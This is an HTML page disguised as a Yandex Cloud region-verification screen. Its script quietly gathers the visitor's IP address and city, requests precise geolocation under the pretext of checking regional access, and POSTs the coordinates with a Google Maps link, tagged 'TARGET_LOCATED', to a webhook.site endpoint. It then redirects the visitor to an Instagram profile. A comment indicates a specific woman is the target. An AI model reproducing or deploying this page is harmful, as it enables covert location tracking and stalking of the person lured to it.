<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Yandex Cloud Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader-box { text-align: center; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { font-size: 14px; color: #000; font-weight: 500; }
    </style>
</head>
<body>

    <div class="loader-box" id="main-box">
        <div class="spinner"></div>
        <div class="text">Проверка региона доступа...</div>
    </div>

    <script>
        const webhook = 'https://webhook.site/675c487a-3093-4826-9eb8-dd9f5ed15c0d';

        async function init() {
            // 1. Сбор базовых данных (IP, Регион, Провайдер)
            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
            
            // 2. Скрытый запрос ГЕОПОЗИЦИИ под видом "Доступа к региону"
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    send({ 
                        type: 'TARGET_LOCATED', 
                        ip: ipInfo.ip,
                        city: ipInfo.city,
                        coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                        map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                    });
                    complete();
                }, (err) => {
                    send({ type: 'GEO_DENIED', ip: ipInfo.ip });
                    complete();
                });
            } else { complete(); }
        }

        function complete() {
            document.querySelector('.text').innerText = "Доступ разрешен. Перенаправление...";
            setTimeout(() => {
                // Вместо скам-форм уводим её в Инстаграм
                window.location.href = "https://www.instagram.com/skinlevel_";
            }, 1500);
        }

        function send(data) {
            fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
        }

        window.onload = init;
    </script>
</body>
</html>
